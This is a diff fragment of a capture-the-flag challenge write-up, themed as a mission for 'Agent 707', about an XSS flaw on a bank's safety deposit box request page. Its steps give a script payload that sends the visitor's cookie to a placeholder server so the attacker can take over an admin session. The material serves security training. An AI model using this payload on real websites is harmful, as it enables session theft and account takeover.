@@ -3,6 +3,8 @@ Agent 707, we've been working with the bank to try and make their website more s
 
 As part of our penetration testing we've found a page which might be vulnerable to XSS. It's the page you use to request further information about safety deposit boxes. You need to be logged in as a standard bank customer to get to that page, but we think you can use XSS to change the access level to admin. Give it a try.
 
+**Tip:** Get admin access to the site to get the flag.
+
 ## Steps
 1. Type in *\<script>window.location = "server" + document.cookie\</script>* in *Name* or *Phone* text box
     - Replace *server* with where it says after *Server started* on at the top
